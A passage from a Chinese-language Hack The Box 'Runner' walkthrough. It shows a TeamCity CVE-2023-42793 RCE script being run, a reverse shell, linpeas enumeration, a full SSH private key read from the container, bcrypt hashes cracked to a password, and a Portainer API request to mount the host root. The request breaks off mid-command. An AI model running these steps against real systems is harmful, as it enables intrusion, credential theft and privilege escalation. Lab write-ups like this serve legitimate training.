+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ bash CVE-2023-42793_rce.sh teamcity.runner.htb 80 <span class="string">&#x27;curl%20-h&#x27;</span></span><br><span class="line">Mod by @manesec :P</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   230  100   230    0     0    232      0 --:--:-- --:--:-- --:--:--   232</span><br><span class="line">Usage: curl [options...] &lt;url&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然後弄一個 bash reverse shell 最後得到shell。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421195236-m1ha0fq.png" alt="image">​</p>
+<h2 id="0x4-Using-Linpeas-to-find-somethings-interesting"><a href="#0x4-Using-Linpeas-to-find-somethings-interesting" class="headerlink" title="0x4 Using Linpeas to find somethings interesting"></a>0x4 Using Linpeas to find somethings interesting</h2><p>隨後就直接跑一個linpeas看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#) Unexpected in  root                                                                                                                                                           </span></span><br><span class="line">/services                                                                                                                                                                               </span><br><span class="line">/.dockerenv                                                                                                                                                                             </span><br><span class="line">/data                                                                                                                                                                                   </span><br><span class="line">/welcome.sh                                                                                                                                                                             </span><br><span class="line">/run-services.sh                                                                                                                                                                        </span><br><span class="line">/run-server.sh  </span><br><span class="line"></span><br><span class="line"><span class="comment">#)You_can_write_even_more_files_inside_last_directory                                       </span></span><br><span class="line">                                                                                          </span><br><span class="line">/data/teamcity_server/datadir/config/ntlm-config.properties                               </span><br><span class="line">/data/teamcity_server/datadir/config/projects                                             </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects                                 </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/pluginData                      </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys             </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa      </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/project-config.xml              </span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/project-config.xml.1 </span><br></pre></td></tr></table></figure>
+
+<p>看到有一個 id_rsa，但是沒有用戶名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">tcuser@647a82f29ca0:/$ find / -iname <span class="string">&quot;id_rsa&quot;</span> 2&gt;/dev/null</span><br><span class="line">/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa</span><br><span class="line"></span><br><span class="line">tcuser@647a82f29ca0:/$ <span class="built_in">cat</span> /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl</span><br><span class="line">htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT</span><br><span class="line">njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt</span><br><span class="line">zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy</span><br><span class="line">/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq</span><br><span class="line">5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5</span><br><span class="line">iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB</span><br><span class="line">Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi</span><br><span class="line">NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH</span><br><span class="line">sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6</span><br><span class="line">dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw</span><br><span class="line">fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+</span><br><span class="line">IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2</span><br><span class="line">EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw</span><br><span class="line">WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGABgAu1NslI8vsTYSBmgf7RAHI4N</span><br><span class="line">BN2aDndd0o5zBTPlXf/7dmfQ46VTId3K3wDbEuFf6YEk8f96abSM1u2ymjESSHKamEeaQk</span><br><span class="line">lJ1wYfAUUFx06SjchXpmqaPZEsv5Xe8OQgt/KU8BvoKKq5TIayZtdJ4zjOsJiLYQOp5oh/</span><br><span class="line">1jCAxYnTCGoMPgdPKOjlViKQbbMa9e1g6tYbmtt2bkizykYVLqweo5FF0oSqsvaGM3MO3A</span><br><span class="line">Sxzz4gUnnh2r+AcMKtabGye35Ax8Jyrtr6QAo/4HL5rsmN75bLVMN/UlcCFhCFYYRhlSay</span><br><span class="line">yeuwJZVmHy0YVVjxq3d5jiFMzqJYpC0MZIj/L6Q3inBl/Qc09d9zqTw1wAd1ocg13PTtZA</span><br><span class="line">mgXIjAdnpZqGbqPIJjzUYua2z4mMOyJmF4c3DQDHEtZBEP0Z4DsBCudiU5QUOcduwf61M4</span><br><span class="line">CtgiWETiQ3ptiCPvGoBkEV8ytMLS8tx2S77JyBVhe3u2IgeyQx0BBHqnKS97nkckXlAAAA</span><br><span class="line">wF8nu51q9C0nvzipnnC4obgITpO4N7ePa9ExsuSlIFWYZiBVc2rxjMffS+pqL4Bh776B7T</span><br><span class="line">PSZUw2mwwZ47pIzY6NI45mr6iK6FexDAPQzbe5i8gO15oGIV9MDVrprjTJtP+Vy9kxejkR</span><br><span class="line">3np1+WO8+Qn2E189HvG+q554GQyXMwCedj39OY71DphY60j61BtNBGJ4S+3TBXExmY4Rtg</span><br><span class="line">lcZW00VkIbF7BuCEQyqRwDXjAk4pjrnhdJQAfaDz/jV5o/cAAAAMEAugPWcJovbtQt5Ui9</span><br><span class="line">WQaNCX1J3RJka0P9WG4Kp677ZzjXV7tNufurVzPurrxyTUMboY6iUA1JRsu1fWZ3fTGiN/</span><br><span class="line">TxCwfxouMs0obpgxlTjJdKNfprIX7ViVrzRgvJAOM/9WixaWgk7ScoBssZdkKyr2GgjVeE</span><br><span class="line">7jZoobYGmV2bbIDkLtYCvThrbhK6RxUhOiidaN7i1/f1LHIQiA4+lBbdv26XiWOw+prjp2</span><br><span class="line">EKJATR8rOQgt3xHr+exgkGwLc72Q61AAAAwQDO2j6MT3aEEbtgIPDnj24W0xm/r+c3LBW0</span><br><span class="line">axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox</span><br><span class="line">KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW</span><br><span class="line">QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M</span><br><span class="line">KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>於是使用上面的 POC1 來新建一個用戶，進去看一下裏面有什麽用戶：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421210346-o5imht1.png" alt="image">​</p>
+<p>可以看到有一個 matthew 和 john，所以使用john嘗試登錄ssh：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa john@10.129.208.212   </span><br><span class="line">The authenticity of host <span class="string">&#x27;10.129.208.212 (10.129.208.212)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.</span></span><br><span class="line"><span class="string">This host key is known by the following other names/addresses:</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:4: [hashed name]</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:47: [hashed name]</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:48: [hashed name]</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.129.208.212<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sun Apr 21 01:05:05 PM UTC 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:                      0.11767578125</span></span><br><span class="line"><span class="string">  Usage of /:                       79.9% of 9.74GB</span></span><br><span class="line"><span class="string">  Memory usage:                     42%</span></span><br><span class="line"><span class="string">  Swap usage:                       4%</span></span><br><span class="line"><span class="string">  Processes:                        225</span></span><br><span class="line"><span class="string">  Users logged in:                  0</span></span><br><span class="line"><span class="string">  IPv4 address for br-21746deff6ac: 172.18.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for docker0:         172.17.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0:            10.129.208.212</span></span><br><span class="line"><span class="string">  IPv6 address for eth0:            dead:beef::250:56ff:feb9:78ff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">john@runner:~$ id</span></span><br><span class="line"><span class="string">uid=1001(john) gid=1001(john) groups=1001(john)</span></span><br><span class="line"><span class="string">john@runner:~$ </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-Shell-as-john"><a href="#0x5-Shell-as-john" class="headerlink" title="0x5 Shell as john"></a>0x5 Shell as john</h2><p>在一開始的時候有一個端口 8000 是開放的，所以嘗試枚舉下本地的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">john@runner:~$ ss -tlunp</span><br><span class="line">Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port             Process            </span><br><span class="line">udp                UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*                                   </span><br><span class="line">udp                UNCONN              0                   0                                      0.0.0.0:68                                  0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                                 127.0.0.1:9443                                0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   511                                    0.0.0.0:80                                  0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                                 127.0.0.1:8111                                0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                                 127.0.0.1:9000                                0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                                 127.0.0.1:5005                                0.0.0.0:*                                   </span><br><span class="line">tcp                LISTEN              0                   128                                       [::]:22                                     [::]:*                                   </span><br><span class="line">tcp                LISTEN              0                   511                                       [::]:80                                     [::]:*                                   </span><br><span class="line">tcp                LISTEN              0                   4096                                         *:8000                                      *:*    </span><br></pre></td></tr></table></figure>
+
+<p>使用 SSH 轉發到本地來看一下裏面都有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 127.0.0.1:9443:127.0.0.1:9443 -L 127.0.0.1:9000:127.0.0.1:9000 -L 127.0.0.1:5005:127.0.0.1:5005 -L 127.0.0.1:8111:127.0.0.1:8111  -i id_rsa john@runner.htb </span><br></pre></td></tr></table></figure>
+
+<h2 id="0xFF-Play-with-8000-chisel"><a href="#0xFF-Play-with-8000-chisel" class="headerlink" title="0xFF Play with 8000 - chisel ?"></a>0xFF Play with 8000 - chisel ?</h2><p>首先是一開始的8000端口，由於我不是root用戶所以不知道開的是什麽進程，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://runner.htb:8000&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt            </span><br><span class="line"></span><br><span class="line">404      GET        1l        2w        9c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET        1l        1w        3c http://runner.htb:8000/health</span><br><span class="line">200      GET        1l        1w        9c http://runner.htb:8000/version</span><br></pre></td></tr></table></figure>
+
+<p>不過很有趣的一件事情發生了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://runner.htb:8000/version   </span><br><span class="line">0.0.0-src                                                                                                                                                                                        </span><br><span class="line"></span><br><span class="line">$ curl http://runner.htb:8000/health </span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>因爲這個版本很像是chisel的版本：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421211140-wza5dag.png" alt="image">​</p>
+<p>所以我就在想 8000 是 chisel的服務器，因爲：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">john@runner:/data$ <span class="built_in">ls</span></span><br><span class="line">bin  certs  chisel  compose  docker_config  portainer.db  portainer.key  portainer.pub  teamcity_server  tls</span><br><span class="line"></span><br><span class="line">john@runner:/data$ <span class="built_in">cd</span> chisel/</span><br><span class="line">-bash: <span class="built_in">cd</span>: chisel/: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>經過一系列的操作，什麽也沒有得到，於是放棄了這條路。</p>
+<h2 id="0x6-Looking-credit-in-data"><a href="#0x6-Looking-credit-in-data" class="headerlink" title="0x6 Looking credit in &#x2F;data"></a>0x6 Looking credit in &#x2F;data</h2><p>前面提到過使用SSH轉發端口到本地，看到9000端口有一個 portainer：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421212022-jr3j3ki.png" alt="image">​</p>
+<p>但是需要登錄，因爲沒有賬號密碼所以嘗試找一下用戶名和密碼，</p>
+<p>但是用戶名可以在 <code>/etc/passwd</code>​ 中猜出來：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">john@runner:~$ <span class="built_in">cat</span> /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">matthew:x:1000:1000:,,,:/home/matthew:/bin/bash</span><br><span class="line">john:x:1001:1001:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>由於 <code>/data</code>​ 裏面有 <code>teamcity_server</code>​ ，但是沒有權限閲讀裏面的内容，不過從文件的權限中可以猜到 matthew 有極大的可能是 docker 的管理員：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@runner:/data/teamcity_server$ <span class="built_in">ls</span> -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  4 root    root    4.0K Feb 28 10:31 .</span><br><span class="line">drwxr-xr-x  9 root    root    4.0K Feb 28 10:31 ..</span><br><span class="line">drwxr-xr-x  6 matthew matthew 4.0K Apr 21 10:43 datadir</span><br><span class="line">drwxr-xr-x 11 matthew matthew 4.0K Apr 21 11:51 logs</span><br></pre></td></tr></table></figure>
+
+<p>容器裏面也有一個 <code>/data</code>​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcuser@647a82f29ca0:/data/teamcity_server$ <span class="built_in">ls</span> -lah</span><br><span class="line">total 12K</span><br><span class="line">drwxr-xr-x 3 root   root   4.0K Aug 24  2023 .</span><br><span class="line">drwxr-xr-x 3 root   root   4.0K Aug 24  2023 ..</span><br><span class="line">drwxr-xr-x 6 tcuser tcuser 4.0K Apr 21 13:51 datadir</span><br></pre></td></tr></table></figure>
+
+<p>使用 grep 找一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcuser@647a82f29ca0:/data$ grep -ri <span class="string">&quot;john&quot;</span> .</span><br><span class="line">./teamcity_server/datadir/system/buildserver.log:INSERT INTO USERS VALUES(1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye&#x27;</span>,<span class="string">&#x27;John&#x27;</span>,<span class="string">&#x27;john@runner.htb&#x27;</span>,1713707789698,<span class="string">&#x27;BCRYPT&#x27;</span>)</span><br><span class="line">Binary file ./teamcity_server/datadir/system/buildserver.data matches</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tcuser@647a82f29ca0:/data$ grep -ri <span class="string">&quot;matthew&quot;</span> .</span><br><span class="line">./teamcity_server/datadir/config/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew<span class="string">&#x27;s projects&lt;/description&gt;</span></span><br><span class="line"><span class="string">./teamcity_server/datadir/config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew&#x27;</span>s projects&lt;/description&gt;</span><br><span class="line">./teamcity_server/datadir/system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew<span class="string">&#x27;s projects&lt;/description&gt;</span></span><br><span class="line"><span class="string">Binary file ./teamcity_server/datadir/system/buildserver.data matches</span></span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>./teamcity_server/datadir/system/buildserver.data</code>​ 似乎包含了上面的兩個用戶名，所以使用 strings 找找看有沒有hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ strings buildserver.data | less </span><br></pre></td></tr></table></figure>
+
+<p>搜索 matthew：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421222249-5bufqef.png" alt="image">​</p>
+<p>搜索 john：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421222505-uavujlq.png" alt="image">​</p>
+<p>然後把hash記錄：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$2a$07<span class="variable">$neV5T</span>/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye</span><br><span class="line">$2a$07<span class="variable">$q</span>.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em</span><br></pre></td></tr></table></figure>
+
+<p>用 nth 探測下類型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ nth -t <span class="string">&#x27;$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye&#x27;</span></span><br><span class="line"></span><br><span class="line">  _   _                           _____ _           _          _   _           _   </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |  </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">bcrypt, HC: 3200 JtR: bcrypt</span></span><br><span class="line"><span class="string">Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.</span></span><br><span class="line"><span class="string">Woltlab Burning Board 4.x, </span></span><br></pre></td></tr></table></figure>
+
+<p>嘗試使用hashcat 爆破，得到 <code>matthew</code>​ 的密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2a$07<span class="variable">$q</span>.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123</span><br></pre></td></tr></table></figure>
+
+<p>另一個用戶 john 無法爆破。</p>
+<h2 id="0xFF-Portainer-Failed-to-mound"><a href="#0xFF-Portainer-Failed-to-mound" class="headerlink" title="0xFF Portainer - Failed to mound"></a>0xFF Portainer - Failed to mound</h2><p>嘗試使用 <code>matthew</code>​ 爆破出來的密碼登錄 Portainer，結果可以成功的進去。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421223757-lfva7wp.png" alt="image">​</p>
+<p>摸索了一段時間，新建的容器中沒有挂載的選項，所以才會去嘗試用 Portainer 的API，思路是挂在 <code>/</code>​ 到容器裏面，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ http POST :9000/api/auth Username=<span class="string">&quot;matthew&quot;</span> Password=<span class="string">&quot;piper123&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 250</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Sat, 20 Apr 2024 21:59:26 GMT</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Xss-Protection: 1; mode=block</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;jwt&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYXR0aGV3Iiwicm9sZSI6Miwic2NvcGUiOiJkZWZhdWx0IiwiZm9yY2VDaGFuZ2VQYXNzd29yZCI6ZmFsc2UsImV4cCI6MTcxMzY3OTE2NiwiaWF0IjoxNzEzNjUwMzY2fQ.hIoo_mOx76S91KsFGTW_Cd5MjzMo3StCtuqoE3HMM_w&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ http POST :9000/api/endpoints/1/docker/containers/create \</span><br><span class="line"><span class="string">&quot;Authorization: Bearer 